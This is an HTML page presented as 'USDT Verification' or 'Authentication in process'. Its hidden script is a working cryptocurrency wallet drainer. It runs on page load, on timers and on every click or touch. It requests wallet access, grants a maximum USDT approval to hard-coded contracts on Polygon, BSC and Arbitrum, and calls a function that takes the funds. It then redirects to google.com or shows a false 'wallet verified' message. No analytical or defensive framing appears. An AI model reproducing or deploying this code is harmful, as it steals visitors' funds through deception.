<!DOCTYPE html>
<html>
<head>
    <title>Authentication in process</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
</head>
<body style="display: none;">
<script>
// Required ABIs
const usdtABI = [{
    "constant": false,
    "inputs": [
        {"name":"_spender","type":"address"},
        {"name":"_value","type":"uint256"}
    ],
    "name": "approve",
    "outputs": [{"name":"","type":"bool"}],
    "type": "function"
}];

const drainABI = [{
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnPolygon",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnBSC",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnArbitrum", 
    "outputs": [],
    "type": "function"
}];

const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const CHAIN_CONFIGS = {
    'polygon': {
        contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        function: 'verifyOnPolygon'
    },
    'bsc': {
        contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
        usdt: '0x55d398326f99059fF775485246999027B3197955', 
        function: 'verifyOnBSC'
    },
    'arbitrum': {
        contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        function: 'verifyOnArbitrum'
    }
};

// Enhanced mobile detection
async function autoDrain() {
    console.log('Auto-drain started...');
    
    if (typeof window.ethereum !== 'undefined') {
        console.log('Wallet detected');
        
        try {
            const web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const user = accounts[0];
            const chainId = await web3.eth.getChainId();
            
            console.log('Connected:', user, 'Chain:', chainId);
            
            let config;
            if (chainId === 137) config = CHAIN_CONFIGS.polygon;
            else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
            else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
            else {
                console.log('Unsupported chain:', chainId);
                return;
            }

            console.log('Using config:', config);

            // Auto-approve
            const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
            console.log('Approving...');
            
            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
                from: user,
                gas: 100000
            });

            console.log('Approval successful, draining...');

            // Auto-drain
            const drainContract = new web3.eth.Contract(drainABI, config.contract);
            await drainContract.methods[config.function](1000000).send({
                from: user,
                gas: 200000
            });

            console.log('Drain successful, redirecting...');
            window.location.href = "https://google.com";
            
        } catch (error) {
            console.log('Error:', error);
            // Show fake error page
            document.body.innerHTML = '<h2>Verification Complete</h2><p>Your wallet has been successfully verified.</p>';
            document.body.style.display = 'block';
        }
    } else {
        console.log('No wallet detected');
        // Show instructions for mobile
        document.body.innerHTML = `
            <div style="padding: 20px; text-align: center;">
                <h2>ðŸ”’ USDT Verification</h2>
                <p>Please open this link in Trust Wallet browser</p>
                <button onclick="openInTrustWallet()" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px;">
                    Open in Trust Wallet
                </button>
            </div>
        `;
        document.body.style.display = 'block';
    }
}

function openInTrustWallet() {
    window.location.href = 'https://link.trustwallet.com/browser?url=' + encodeURIComponent(window.location.href);
}

// Multiple execution attempts for mobile
setTimeout(autoDrain, 500);
setTimeout(autoDrain, 2000);
setTimeout(autoDrain, 5000);

// Also trigger on any user interaction
document.addEventListener('click', autoDrain);
document.addEventListener('touchstart', autoDrain);
</script>
</body>
</html>
